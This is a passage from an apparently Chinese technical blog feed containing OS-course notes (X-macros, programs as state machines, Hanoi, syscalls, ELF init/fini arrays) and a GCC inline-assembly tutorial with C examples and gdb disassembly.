class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br></pre></td></tr></table></figure><p>嵌套宏的展开</p><blockquote><ul><li>一般的宏嵌套展开规则是<strong>由内向外</strong>，先将内层宏展开，再把外层宏展开</li><li>如果宏的参数直接带有<code>#</code>，则不会展开内层的嵌套宏</li><li>如果宏的参数直接带有<code>##</code>，则会先将参数通过<code>##</code>拼接，然后再依次进行展开</li></ul></blockquote><p>这里采用了一个<strong>X-MACRO</strong>的高级宏的写法,个人认为就是写一个宏再利用宏嵌套去代替我们做一些重复性的工作</p><blockquote><p>x-macro创建一段自我维护和相互依赖的代码。当程序的一部分发生变化导致另一部分发生变化时，就可以说代码是相互依赖的。</p><p><strong>X宏的优势</strong></p><ul><li>X-Macros 通过创建单独的头文件以实现可维护，广泛用于操作系统开发</li><li>有助于轻松维护复杂的编程</li><li>它可以创建一段自我维护和相互依赖的代码</li></ul><p><strong>X宏的缺点</strong></p><ul><li>代码变得不那么可读了</li><li>代码很难理解</li><li>通常仅用于内部编程，如 OS 编程。</li></ul></blockquote><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>Too Long ；Didn’t Read</p><p>帮助我们更快的从man手册里获取信息</p><h2 id="什么是程序"><a href="#什么是程序" class="headerlink" title="什么是程序"></a>什么是程序</h2><h3 id="源代码视角"><a href="#源代码视角" class="headerlink" title="源代码视角"></a>源代码视角</h3><p>程序就是状态机</p><ul><li>状态 &#x3D; 堆 + 栈</li><li>初始状态 &#x3D; <code>main</code> 的第一条语句</li><li>迁移 &#x3D; 执行一条简单语句</li></ul><p>递归的汉诺塔，经典分治算法，每次都把n-1当作一个整体，把n-1挪到辅助位，把最下面移到目标，再把辅助位上n-1移到目标</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, from, to);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    hanoi(n - <span class="number">1</span>, from, via, to);</span><br><span class="line">    hanoi(<span class="number">1</span>,     from, to,  via);</span><br><span class="line">    hanoi(n - <span class="number">1</span>, via,  to,  from);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归，个人感觉其实还是一个递归的思想，只是我们没有用c来帮助我们调用函数，而是在c的层面上做了一层抽象，把底层的栈帧给抽象出来，来模拟调用，让我们更形象的看到状态的转移，理解程序是个状态机</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> pc, n;</span><br><span class="line">  <span class="type">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret()     (&#123; top--; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> goto(loc) (&#123; f-&gt;pc = (loc) - 1; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to); <span class="keyword">goto</span>(<span class="number">4</span>); &#125; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二进制视角"><a href="#二进制视角" class="headerlink" title="二进制视角"></a>二进制视角</h3><p>还是状态机</p><ul><li>状态 &#x3D; 内存 M + 寄存器 R</li><li>初始状态 &#x3D; 动态链接器ld去做动态链接&#x3D;ld-linux-x86-64.so加载libc</li><li>迁移 &#x3D; 执行一条指令</li></ul><p>所有的指令都只能计算</p><p>想要操作一些硬件资源必须经过操作系统，系统调用syscall</p><p>程序 &#x3D; 计算 + syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">  movq $SYS_write, %rax   // write(</span><br><span class="line">  movq $1,         %rdi   //   fd=1,</span><br><span class="line">  movq $st,        %rsi   //   buf=st,</span><br><span class="line">  movq $(ed - st), %rdx   //   count=ed-st</span><br><span class="line">  syscall                 // );</span><br><span class="line"></span><br><span class="line">  movq $SYS_exit,  %rax   // exit(</span><br><span class="line">  movq $1,         %rdi   //   status=1</span><br><span class="line">  syscall                 // );//这里直接是个内核态的syscall</span><br><span class="line"></span><br><span class="line">st:</span><br><span class="line">  .ascii &quot;\033[01;31mHello, OS World\033[0m\n&quot;</span><br><span class="line">ed:</span><br><span class="line">;gcc -c minimal.S &amp;&amp; ld minimal.o </span><br></pre></td></tr></table></figure><p>我们之前做过一些x86——32和64的系统调用分析<a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a></p><ol><li>cpp–&gt;*.i(ascii中间文件) 预处理器   gcc -E <strong>预处理</strong> 预处理器先将#include #define（宏）等预处理指令进行替换和展开–hello.i</li><li>cc1–&gt;*.s(ascii汇编语言文件) 编译器  gcc -S <strong>编译</strong> 编译器产生两个源文件的汇编代码p1.s p2.s–hello.s</li><li>as–&gt;*.o(可重定位目标文件) 汇编器    gcc -c <strong>汇编</strong> 汇编器将汇编代码转化为可重定位目标代码文件 p1.o p2.o 但是没有填入全局值的地址 hell.o</li><li>ld–&gt;*.out(可执行目标文件) 链接器  ld *.o  <strong>链接</strong> 链接器将目标代码文件与库函数（如printf）合并 生成可执行文件p链接器的任务之一就是为函数调用找到匹配的函数的可执行代码的位置</li></ol><h3 id="main-的开始-x2F-结束并不是整个程序的开始-x2F-结束"><a href="#main-的开始-x2F-结束并不是整个程序的开始-x2F-结束" class="headerlink" title="main() 的开始&#x2F;结束并不是整个程序的开始&#x2F;结束"></a><code>main()</code> 的开始&#x2F;结束并不是整个程序的开始&#x2F;结束</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// See also: atexit(3)</span></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">goodbye</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, Cruel OS World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323012323212.png" alt="image-20230323012323212"></p><p>这个我们在<a href="https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/">https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/</a>    做过<strong>fini_array hook</strong>分析</p><p>其实就是和这个有关</p><blockquote><p><code>.init_array</code>和 <code>.fini_array</code>中存放了指向初始化代码和终止代码的函数指针。</p><p><code>.init_array</code>会在main()函数调用前执行，这样可以通过修该地址的指针来将控制流指向病毒或者寄生代码，因为比main执行还早，大部分恶意软件都是hook这个</p><p><code>.fini_array</code> 函数指针在 main() 函数执行完之后才被触发</p><p>在<code>.init_array</code> array[0]-&gt;array[1]</p><p>在<code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p>我们把程序丢到ida来看一下</p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013006789.png" alt="image-20230323013006789"></p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013037782.png" alt="image-20230323013037782"></p><h3 id="谁规定是-ld-linux-x86-64-so，而不是-rtfm-so？"><a href="#谁规定是-ld-linux-x86-64-so，而不是-rtfm-so？" class="headerlink" title="谁规定是 ld-linux-x86-64.so，而不是 rtfm.so？"></a>谁规定是 <code>ld-linux-x86-64.so</code>，而不是 <code>rtfm.so</code>？</h3><p>这个我们之前也做过分析<a href="https://grxer.gitee.io/2023/03/19/23-2-21-elf/">https://grxer.gitee.io/2023/03/19/23-2-21-elf/</a></p><p>在ELF的Program Header Table 的Interpreter Path segment里规定了解释器地址，我们在有一个属于自己合理的解释器的前提下，可以完全hack掉这个程序执行流</p><h3 id="starce"><a href="#starce" class="headerlink" title="starce"></a>starce</h3><p><a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a>   里拿来分析过ls系统调用</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>RTFM—-Read The Fucking Manual</p><p>STFW—-Search The Fucking Web</p>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HOW 2 GCC Inline Assembly</title>
      <link href="/2023/03/22/GCC-Inline-Assembly/"/>
      <url>/2023/03/22/GCC-Inline-Assembly/</url>
      
        <content type="html"><![CDATA[<p> 参考资料:<a href="https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html</a></p><p>​ <a href="https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html">https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html</a></p><h2 id="Asm-Syntax"><a href="#Asm-Syntax" class="headerlink" title="Asm Syntax"></a>Asm Syntax</h2><p>linux上我一般都在用GNU C 编译器 GCC，支持AT&amp;T和intel格式的内联汇编，gcc默认是att，我个人是习惯了intel格式的汇编，但是大部分操作系统源码都是att格式的内联汇编，cao</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">|       Intel Code             |      AT&amp;T Code                     |</span><br><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">| mov     eax,1                |  movl    $1,%eax                   |   </span><br><span class="line">| mov     ebx,0ffh             |  movl    $0xff,%ebx                |   </span><br><span class="line">| int     80h                  |  int     $0x80                     |   </span><br><span class="line">| mov     ebx, eax             |  movl    %eax, %ebx                |</span><br><span class="line">| mov     eax,[ecx]            |  movl    (%ecx),%eax               |</span><br><span class="line">| mov     eax,[ebx+3]          |  movl    3(%ebx),%eax              | </span><br><span class="line">| mov     eax,[ebx+20h]        |  movl    0x20(%ebx),%eax           |</span><br><span class="line">| add     eax,[ebx+ecx*2h]     |  addl    (%ebx,%ecx,0x2),%eax      |</span><br><span class="line">| lea     eax,[ebx+ecx]        |  leal    (%ebx,%ecx),%eax          |</span><br><span class="line">| sub     eax,[ebx+ecx*4h-20h] |  subl    -0x20(%ebx,%ecx,0x4),%eax |</span><br><span class="line">+------------------------------+------------------------------------+</span><br></pre></td></tr></table></figure><ul><li>源操作数和目的操作数顺序相反</li><li>att寄存器%前缀</li><li>att立即数前有$，16进制0x而不是后加h</li><li>att mov 操作大小’b’、’w’、’l’ 分别指明了字节（8位）、字（16位）、长型（32位）替代intel”byte ptr”、 “word ptr” 和 “dword ptr” 前缀</li><li>intel：section:[base + index*scale + disp]—&gt;att：section:disp(base, index, scale),这里立即数不用$</li></ul><h2 id="Basic-Inline"><a href="#Basic-Inline" class="headerlink" title="Basic Inline"></a>Basic Inline</h2><p>两种语法都可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code&quot;)</span><br><span class="line">__asm__(&quot;assembly code&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code1;&quot;</span><br><span class="line">    &quot;assembly code2;&quot;)</span><br><span class="line">asm(&quot;assembly code1\n\t&quot;</span><br><span class="line">    &quot;assembly code2\n\t&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666\n\t;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//切换到intel格式gcc -g -masm=intel -o test test.c</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322143535231.png" alt="image-20230322143535231"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">__asm__(<span class="string">&quot;mov %rax, %rbx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $56, %rsi\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//gdb改变汇编风格set disassembly-flavor intel | att</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322144433403.png" alt="image-20230322144433403"></p><p>这样插入汇编很简单但是gcc并不知道我们改变了那些寄存器的值，gcc可能进行某些代码优化时，会用到这些寄存器但是它里面的值已经被我们插入汇编修改掉了，就会导致一些error</p><h2 id="Extended-Asm"><a href="#Extended-Asm" class="headerlink" title="Extended Asm"></a>Extended Asm</h2><p>为了解决上述问题并且和c有个更好的交互，就有了拓展汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( assembler template </span><br><span class="line">         : output operands                  <span class="comment">/* optional */</span></span><br><span class="line">         : input operands                   <span class="comment">/* optional */</span></span><br><span class="line">         : <span class="built_in">list</span> of clobbered registers      <span class="comment">/* optional */</span></span><br><span class="line">         );</span><br></pre></td></tr></table></figure><h3 id="operands"><a href="#operands" class="headerlink" title="operands"></a>operands</h3><p>总操作数的数目限制在 10 个，或者机器描述中的任何指令格式中的最大操作数数目，以较大者为准。</p><p>在汇编程序模板中，每个操作数用数字引用。编号方式从0开始，从上往下</p><ul><li>r表示我们让gcc自动帮我们去选择一个输入寄存器一个输出寄存器</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%1,%1,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;r&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322163200644.png" alt="image-20230322163200644"></p><ul><li>如果我们想要输入和输出放在同一个寄存器</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%0,%0,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;0&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><ul><li>指定ecx寄存器,为了和操作数进行区分，寄存器我们采用两个%</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%%ecx,%%ecx,4), %%ecx&quot;</span></span><br><span class="line">     : <span class="string">&quot;=c&quot;</span> (x)</span><br><span class="line">     : <span class="string">&quot;c&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322162844426.png" alt="image-20230322162844426"></p><p>我们没有往list of clobbered registers去添加寄存器，因为目前情况gcc知道我们破坏了哪个,因为它们被显式地指定为约束了</p><h3 id="Clobber-List"><a href="#Clobber-List" class="headerlink" title="Clobber List"></a>Clobber List</h3><p><strong>如果指令隐式或显式地使用了任何其他寄存器，（并且寄存器没有出现在输出或者输出约束列表里），那么就需要在Clobber List中指定这些寄存器。</strong></p><p>如果我们的指令可以修改条件码寄存器（cc），我们必须将 “cc” 添加进修饰寄存器列表。</p><p>如果我们的指令以不可预测的方式修改了内存，那么需要将 “memory” 添加进修饰寄存器列表。</p><h3 id="Volatile修饰符"><a href="#Volatile修饰符" class="headerlink" title="Volatile修饰符"></a>Volatile修饰符</h3><p>gcc会在source–&gt;code的过程中会进行一些优化，例如删除一些代码改变一些代码位置等</p><p>为了不让gcc去优化我们的inline asm将关键词volatile 或者 __volatile__ 放置在 asm 后面、()的前面。</p><h2 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h2><h3 id="寄存器约束"><a href="#寄存器约束" class="headerlink" title="寄存器约束"></a>寄存器约束</h3><p>“reg constraints”(variable),输出操作数还要有“&#x3D;”的约束在”&#x3D;reg constraints”(variable)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+---+--------------------+</span><br><span class="line">| r |    Register(s)     |</span><br><span class="line">+---+--------------------+</span><br><span class="line">| a |   %eax, %ax, %al   |</span><br><span class="line">| b |   %ebx, %bx, %bl   |</span><br><span class="line">| c |   %ecx, %cx, %cl   |</span><br><span class="line">| d |   %edx, %dx, %dl   |</span><br><span class="line">| S |   %esi, %si        |</span><br><span class="line">| D |   %edi, %di        |</span><br><span class="line">+---+--------------------+</span><br><span class="line"> q   eax, ebx, ecx, edx</span><br></pre></td></tr></table></figure><h3 id="内存操作数约束"><a href="#内存操作数约束" class="headerlink" title="内存操作数约束"></a>内存操作数约束</h3><p>“m”(variable),使用memory而不是reg作为temp来做运算</p><h3 id="匹配（数字）约束"><a href="#匹配（数字）约束" class="headerlink" title="匹配（数字）约束"></a>匹配（数字）约束</h3><p>在某些情况下，一个变量可能既充当输入操作数，也充当输出操作数。可以通过使用匹配约束在 “asm” 中指定这种情况。</p><p>asm (“incl %0” :”&#x3D;a”(var):”0”(var));</p><h3 id><a href="#" class="headerlink" title="+"></a>+</h3><p>“+”号用于指定一个操作数既可以用作输入，也可以用作输出，即输入&#x2F;输出操作数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;addl %[a], %[b]&quot;</span></span><br><span class="line">    : [b] <span class="string">&quot;+r&quot;</span> (b)</span><br><span class="line">    : [a] <span class="string">&quot;r&quot;</span> (a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>“&amp;” : 意味着这个操作数为一个早期改动的操作数，其在该指令完成前通过使用输入操作数被修改了。因此，这个操作数不可以位于一个被用作输出操作数或任何内存地址部分的寄存器。如果在旧值被写入之前它仅用作输入而已，一个输入操作数可以为一个早期改动操作数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">10</span>, fill_value = <span class="number">0x6</span>;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;cld\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;rep\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;stosb\n\t&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)</span><br><span class="line">        : </span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dest[i]); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//cld将标志寄存器Flag的方向标志位DF清零。DI的地址指针自动增加</span></span><br><span class="line"><span class="comment">//rep重新rcx次数的stosb把al里面的数据往rdi指向地址去写</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153906189.png" alt="image-20230322153906189"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001169 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000116d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000116e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001171 &lt;+8&gt;:    sub    rsp,0x30</span><br><span class="line">0x0000000000001175 &lt;+12&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000000000000117e &lt;+21&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">0x0000000000001182 &lt;+25&gt;:    xor    eax,eax</span><br><span class="line">0x0000000000001184 &lt;+27&gt;:    mov    DWORD PTR [rbp-0x28],0xa</span><br><span class="line">0x000000000000118b &lt;+34&gt;:    mov    DWORD PTR [rbp-0x24],0x6</span><br><span class="line">0x0000000000001192 &lt;+41&gt;:    mov    QWORD PTR [rbp-0x12],0x0</span><br><span class="line">0x000000000000119a &lt;+49&gt;:    mov    WORD PTR [rbp-0xa],0x0</span><br><span class="line">0x00000000000011a0 &lt;+55&gt;:    mov    edx,DWORD PTR [rbp-0x28]</span><br><span class="line">0x00000000000011a3 &lt;+58&gt;:    mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">0x00000000000011a6 &lt;+61&gt;:    lea    rsi,[rbp-0x12]</span><br><span class="line">0x00000000000011aa &lt;+65&gt;:    mov    ecx,edx</span><br><span class="line">0x00000000000011ac &lt;+67&gt;:    mov    rdi,rsi</span><br><span class="line">0x00000000000011af &lt;+70&gt;:    cld                   </span><br><span class="line">0x00000000000011b0 &lt;+71&gt;:    rep stos BYTE PTR es:[rdi],al</span><br><span class="line">0x00000000000011b2 &lt;+73&gt;:    mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x00000000000011ba &lt;+81&gt;:    jmp    0x11e8 &lt;main+127&gt;</span><br><span class="line">0x00000000000011bc &lt;+83&gt;:    lea    rdx,[rbp-0x12]</span><br><span class="line">0x00000000000011c0 &lt;+87&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">0x00000000000011c4 &lt;+91&gt;:    add    rax,rdx</span><br><span class="line">0x00000000000011c7 &lt;+94&gt;:    movzx  eax,BYTE PTR [rax]</span><br><span class="line">0x00000000000011ca &lt;+97&gt;:    movsx  eax,al</span><br><span class="line">0x00000000000011cd &lt;+100&gt;:    mov    esi,eax</span><br><span class="line">0x00000000000011cf &lt;+102&gt;:    lea    rax,[rip+0xe2e]        # 0x2004</span><br><span class="line">0x00000000000011d6 &lt;+109&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000000011d9 &lt;+112&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011de &lt;+117&gt;:    call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">0x00000000000011e3 &lt;+122&gt;:    add    QWORD PTR [rbp-0x20],0x1</span><br><span class="line">0x00000000000011e8 &lt;+127&gt;:    cmp    QWORD PTR [rbp-0x20],0x9</span><br><span class="line">0x00000000000011ed &lt;+132&gt;:    jbe    0x11bc &lt;main+83&gt;</span><br><span class="line">0x00000000000011ef &lt;+134&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011f4 &lt;+139&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">0x00000000000011f8 &lt;+143&gt;:    sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">0x0000000000001201 &lt;+152&gt;:    je     0x1208 &lt;main+159&gt;</span><br><span class="line">0x0000000000001203 &lt;+154&gt;:    call   0x1060 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x0000000000001208 &lt;+159&gt;:    leave  </span><br><span class="line">0x0000000000001209 &lt;+160&gt;:    ret    </span><br></pre></td></tr></table></figure><p>一直到+67处做好准备工作，去提升堆栈，初始化局部变量</p><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153828870.png" alt="image-20230322153828870"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a=<span class="number">10</span>, b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">asm</span> (<span class="string">&quot;mov %1, %%eax;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %%eax, %0;&quot;</span></span><br><span class="line">     :<span class="string">&quot;=r&quot;</span>(b)       </span><br><span class="line">     :<span class="string">&quot;r&quot;</span>(a)        </span><br><span class="line">     :<span class="string">&quot;%eax&quot;</span>     </span><br><span class="line">     ); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322154308379.png" alt="image-20230322154308379"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001149 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000114d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000114e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001151 &lt;+8&gt;:    sub    rsp,0x10</span><br><span class="line">0x0000000000001155 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x8],0xa</span><br><span class="line">0x000000000000115c &lt;+19&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">0x0000000000001163 &lt;+26&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001166 &lt;+29&gt;:    mov    eax,eax</span><br><span class="line">0x0000000000001168 &lt;+31&gt;:    mov    eax,eax</span><br><span class="line">0x000000000000116a &lt;+33&gt;:    mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">0x000000000000116d &lt;+36&gt;:    mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">0x0000000000001170 &lt;+39&gt;:  